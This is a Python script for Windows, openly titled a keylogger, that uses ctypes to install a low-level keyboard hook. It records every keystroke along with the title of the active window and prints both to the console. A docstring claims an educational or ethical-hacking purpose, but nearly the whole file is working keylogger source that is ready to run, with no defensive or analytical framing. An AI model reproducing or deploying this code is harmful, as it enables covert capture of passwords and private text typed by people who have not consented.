"""
Keylogger Script
This script demonstrates the technique of keystroke logging on Windows using Python and ctypes.
It's intended for educational, security research, or ethical hacking purposes only.

Usage:
- Ensure Python and necessary permissions on the Windows system.
- Run the script in a Python environment with the necessary privileges.

"""

from ctypes import *
from ctypes import wintypes

# Define shorthand for user32 DLL and set up necessary datatypes
user32 = windll.user32
LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

# Win32 function definitions
GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = [wintypes.HWND]
GetWindowTextLengthA.restype = wintypes.INT

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = [wintypes.HWND, wintypes.LPSTR, wintypes.INT]
GetWindowTextA.restype = wintypes.INT

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = [wintypes.INT]
GetKeyState.restype = wintypes.SHORT

keyboard_state = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = [POINTER(keyboard_state)]
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argtypes = [wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), POINTER(wintypes.WORD), wintypes.UINT]
ToAscii.restype = wintypes.INT

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = [wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM]
CallNextHookEx.restype = LRESULT

HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = [wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD]
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = [POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT]
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.DWORD)]

def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    buff = create_string_buffer(length + 1)
    GetWindowTextA(hwnd, buff, length + 1)
    return buff.value

def hook_function(nCode, wParam, lParam):
    global last
    if last != get_foreground_process():
        last = get_foreground_process()
        print("\n[{}]".format(last.decode("latin-1")))
    
    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

        state = keyboard_state()
        GetKeyboardState(byref(state))

        buf = wintypes.WORD()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, byref(buf), 0)

        if n > 0:
            print(chr(buf.value), end="", flush=True)
            if keyboard.vkCode == WM_RETURN:
                print()  # new line after return key
    
    return CallNextHookEx(None, nCode, wParam, lParam)

last = None
callback = HOOKPROC(hook_function)
hook = SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0, 0)

msg = wintypes.MSG()
GetMessageA(byref(msg), 0, 0, 0)
